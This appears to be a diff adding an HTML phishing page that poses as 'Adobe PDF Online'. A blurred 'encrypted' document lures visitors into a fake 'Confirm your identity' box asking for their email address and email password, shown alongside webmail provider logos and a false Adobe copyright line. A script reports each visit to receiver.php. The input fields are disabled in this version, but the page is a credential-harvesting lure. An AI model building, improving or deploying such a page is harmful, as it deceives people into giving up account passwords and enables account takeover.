@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Adobe PDF Online</title>
+  <link rel="stylesheet" href="styles.css" />
+  <style>
+    /* === Overlay Styling === */
+    .blur-overlay {
+      position: fixed;
+      inset: 0;
+      background: url('https://i.ibb.co/jvBRfLqJ/Credit-Note-CECN2501001.jpg') no-repeat center center fixed;
+      background-size: cover;
+      filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      color: white;
+      font-family: Arial, sans-serif;
+      font-size: 20px;
+      font-weight: bold;
+      text-align: center;
+      cursor: pointer;
+      z-index: 9999;
+      opacity: 0;
+      animation: fadeInOverlay 1.2s ease forwards;
+      transition: opacity 0.8s ease, transform 0.8s ease;
+    }
+
+    .blur-overlay.fade-out {
+      opacity: 0;
+      transform: translateY(-50px);
+      pointer-events: none;
+    }
+
+    .blur-overlay span {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 20px 35px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(3px);
+      transition: transform 0.3s ease;
+    }
+
+    .blur-overlay:hover span {
+      transform: scale(1.05);
+    }
+
+    /* Fade-in animation for overlay */
+    @keyframes fadeInOverlay {
+      0% { opacity: 0; transform: scale(1.02); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+  </style>
+</head>
+<body>
+  <!-- Blurred document overlay -->
+  <div class="blur-overlay" id="overlay">
+    <span>🔒 Encrypted File<br><small style="font-size:15px;opacity:0.8;">Click to View</small></span>
+  </div>
+
+  <!-- Soft unlock sound -->
+  <audio id="unlockSound" preload="auto">
+    <source src="https://cdn.pixabay.com/audio/2022/03/15/audio_9b09f1c5a3.mp3" type="audio/mpeg">
+  </audio>
+
+  <!-- Existing Background -->
+  <div class="background"></div>
+
+  <!-- Header Bar -->
+  <div class="header-bar">
+    <div class="header-left">
+      <img src="https://i.ibb.co/xtsKw4XN/Screenshot-2025-05-17-at-12-48-58.png" alt="PDF Logo" />
+      <span>Adobe PDF Online</span>
+    </div>
+    <div class="header-middle"></div>
+    <div class="header-right">
+      <div>Account</div>
+      <div>Sign In</div>
+    </div>
+  </div>
+
+  <!-- Topbar -->
+  <div class="topbar-2">
+    <div class="menu-right">
+      <div class="edit-button">Edit and Reply</div>
+      <div>Download</div>
+      <div>Print</div>
+      <div>Exit</div>
+      <div>...</div>
+    </div>
+  </div>
+
+  <!-- Login Box -->
+  <div class="container" id="login-content" style="opacity:0; transform: translateY(60px); transition: all 0.8s ease;">
+    <div class="login-box">
+      <div class="login-title">
+        <img src="https://i.ibb.co/f3SBGdj/ad2.jpg" alt="PDF Icon" />
+        <span>Adobe PDF Online</span>
+      </div>
+
+      <div class="identity-header">
+        <img src="https://i.ibb.co/HTnddqtP/Chat-GPT-Image-May-17-2025-01-52-59-PM.png" alt="Small Icon" />
+        <strong>Confirm your identity</strong>
+      </div>
+
+      <p>Sign in with your connected and active email account to access document</p>
+
+      <div class="email-icons">
+        <img src="https://i.ibb.co/b5b7g9P1/aol1.png" alt="AOL" />
+        <img src="https://i.ibb.co/nq9q51M3/gm1.jpg" alt="Gmail" />
+        <img src="https://i.ibb.co/0VmVxSNP/out1.webp" alt="Outlook" />
+        <img src="https://i.ibb.co/CKSMDw2v/yah1.webp" alt="Yahoo" />
+      </div>
+
+      <div id="error-msg" style="color: red; font-size: 12px; margin: 5px 0 0 0; display: none;"></div>
+
+      <input type="text" placeholder="Email address" disabled />
+      <input type="password" placeholder="Email password" disabled />
+
+      <div class="checkbox">
+        <label>
+          <input type="checkbox" disabled />
+          <span><span class="stay-bold">Stay signed in</span> <span class="stay-faint">(Do not check if using a public computer)</span></span>
+        </label>
+      </div>
+
+      <div class="btn-wrapper">
+        <button class="btn" disabled>&nbsp;View Document&nbsp;</button>
+      </div>
+
+      <div class="disclaimer">©2025 Adobe Corporation</div>
+    </div>
+  </div>
+
+  <script>
+    const overlay = document.getElementById('overlay');
+    const loginContent = document.getElementById('login-content');
+    const unlockSound = document.getElementById('unlockSound');
+
+    overlay.addEventListener('click', () => {
+      // play sound just before animation
+      unlockSound.currentTime = 0;
+      unlockSound.play();
+      overlay.classList.add('fade-out');
+      setTimeout(() => {
+        overlay.style.display = 'none';
+        loginContent.style.opacity = '1';
+        loginContent.style.transform = 'translateY(0)';
+      }, 800);
+    });
+
+    // backend tracking remains
+    (async () => {
+      try {
+        await fetch("receiver.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({ visit: "1" })
+        });
+      } catch (e) {
+        console.warn("Visit reporting failed:", e);
+      }
+    })();
+  </script>
+</body>
+</html>
